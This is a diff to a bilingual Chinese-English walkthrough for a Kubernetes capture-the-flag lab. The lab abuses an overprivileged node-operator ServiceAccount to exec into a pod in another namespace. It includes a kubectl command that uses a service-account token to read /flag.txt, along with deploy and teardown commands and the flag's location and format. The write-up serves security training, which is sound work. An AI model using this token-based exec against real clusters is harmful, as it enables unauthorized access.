@@ -10,23 +10,10 @@
 | 难度 | L3 |
 | 交付方式 | KIND / Kubernetes |
 | 入口 | KIND 集群内入口（无固定宿主端口） |
+| 集群 | cve-k8s-26-node-redirect |
+| 攻击面 | Node-operator RBAC → cross-namespace pod exec |
 
 ## 场景概述
-- 技术：N/A (overprivileged node-operator RBAC)
-- 难度：L3
-- 交付方式：k8s
-## 攻击路径与利用步骤
-
-## Overview
-| Property | Value |
-|----------|-------|
-| CVE/Technique | N/A -- overprivileged node-operator RBAC (nodes/proxy + pods/exec) |
-| Difficulty | L3 |
-| Type | k8s |
-| Cluster Name | cve-k8s-26-node-redirect |
-| Attack Vector | Node-operator RBAC → cross-namespace pod exec |
-
-## Attack Path
 
 ```
 Compromised node pod with node-operator RBAC
@@ -39,7 +26,12 @@ Compromised node pod with node-operator RBAC
 > 实际的利用点是 node-operator 角色被过度授权：`nodes/proxy` 与 `pods/exec`
 > 均为集群级权限，允许跨命名空间控制任意 pod。
 
-## Step-by-Step Exploitation
+## 前置知识
+
+- kubectl access to KIND cluster `cve-k8s-26-node-redirect`
+- `node-operator` ServiceAccount 拥有集群级 `nodes/proxy`、`pods/exec` 权限
+
+## 利用步骤
 
 ### Step 1: Verify Node Operator Permissions
 
@@ -74,16 +66,18 @@ kubectl --token=$TOKEN --server=https://kubernetes.default.svc \
   exec -n secure-ns victim-pod -- cat /flag.txt
 ```
 
-## Flag Location
-- **Primary**: `/flag.txt` in `victim-pod` in `secure-ns` namespace
-- **Format**: `flag{k8s-26-<16-hex>}`
+## 验证命令
 
-## Verification
 ```bash
 cd cve_challenges/scenarios/k8s/node-redirect && bash deploy.sh
 kubectl exec -n secure-ns victim-pod -- cat /flag.txt
 bash teardown.sh
 ```
+
+## Flag
+
+- **Primary**: `/flag.txt` in `victim-pod` in `secure-ns` namespace
+- **Format**: `flag{k8s-26-<16-hex>}`
 
 ## 此场景利用了哪些知识
 
@@ -96,4 +90,5 @@ bash teardown.sh
 | 验证 | Capture the redirected credential/flag data |
 
 ## 修复建议
+
 升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
